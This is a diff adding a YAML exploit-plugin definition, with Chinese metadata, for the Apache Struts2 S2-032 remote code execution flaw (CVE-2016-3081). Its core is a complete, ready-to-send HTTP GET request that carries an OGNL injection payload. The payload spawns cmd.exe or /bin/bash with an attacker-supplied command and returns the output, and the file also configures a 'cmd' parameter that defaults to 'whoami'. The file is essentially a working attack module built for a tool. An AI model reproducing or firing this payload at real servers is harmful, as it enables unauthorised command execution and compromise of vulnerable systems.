@@ -1,0 +1,32 @@
+info:
+    app: Struts2
+    name: S2_032
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2016-04-27"
+    create_date: "2024-10-06 12:40:29"
+    update_date: "2024-10-06 12:40:29"
+    scope: Struts 2.3.20 - Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)
+    description: 当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。
+    vul_id: CVE-2016-3081
+    detail: |
+        利用点为URI
+        目前只支持cmd
+        URL如http://192.168.111.111:8080/memoindex.action
+        http://struts.apache.org/docs/s2-032.html
+    payload: |
+        GET /memoindex.action?&debug=command&expression=%20((%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)and(%23osname%3D%40java.lang.System%40getProperty('os.name'))and(%23list%3D%23osname.startsWith('Windows')%3F%7B'cmd.exe'%2C'%2Fc'%2C%23parameters.cmd%5B0%5D%7D%3A%7B'%2Fbin%2Fbash'%2C'-c'%2C%23parameters.cmd%5B0%5D%7D)and(%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'))and(%23hh%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'))and(%23aa%3D(new%20java.lang.ProcessBuilder(%23list)).start())and(%23bb%3D%23aa.getInputStream())and(%23hh.getWriter().println(new%20java.lang.String(new%20org.apache.commons.io.IOUtils().toByteArray(%23bb)%2C%23parameters.encode))%3Ftrue%3Atrue)and(%23hh.getWriter().flush()%3Ftrue%3Atrue)and(%23hh.getWriter().close()))&encode=iso-8859-1&cmd=whoami HTTP/1.1
+        Host: 192.168.111.129:8080
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+payloads:
+    - name: cmd1
+      alias: 命令执行1
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
